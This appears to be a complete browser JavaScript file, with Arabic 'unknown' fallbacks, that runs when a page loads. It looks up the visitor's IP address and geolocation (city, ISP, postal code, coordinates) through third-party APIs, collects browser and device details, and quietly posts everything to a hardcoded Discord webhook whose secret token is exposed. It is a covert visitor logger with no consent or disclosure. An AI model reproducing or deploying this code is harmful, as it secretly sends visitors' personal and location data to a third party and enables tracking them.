async function sendVisitorInfo() {
  try {
    const ipData = await fetch('https://api64.ipify.org?format=json')
      .then(res => res.json())
      .catch(() => ({ ip: 'غير معروف' }));

    const ipDetails = await fetch(`https://ipapi.co/${ipData.ip}/json/`)
      .then(res => res.json())
      .catch(() => ({}));

    const info = `
IP: ${ipData.ip}
Country: ${ipDetails.country_name || 'غير معروف'}
City: ${ipDetails.city || 'غير معروف'}
Region: ${ipDetails.region || 'غير معروف'}
ISP: ${ipDetails.org || 'غير معروف'}
Postal: ${ipDetails.postal || 'غير معروف'}
Latitude: ${ipDetails.latitude || 'غير معروف'}
Longitude: ${ipDetails.longitude || 'غير معروف'}
Device: ${navigator.platform}
Browser: ${navigator.userAgent}
Language: ${navigator.language}
Screen: ${window.screen.width}x${window.screen.height}
TimeZone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}
    `;

    await fetch('https://discord.com/api/webhooks/1367442476239159337/VueoMCQB7tuu47sz_ajL4HuhLQ_8dWRWLn5GpjJFm-I4HiDmvgbMQCCkifiLCm49rRTE', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ content: 'New visitor info:\n' + '```' + info + '```' })
    });

  } catch (err) {
    console.error('Error sending info:', err);
  }
}

window.addEventListener('DOMContentLoaded', sendVisitorInfo);
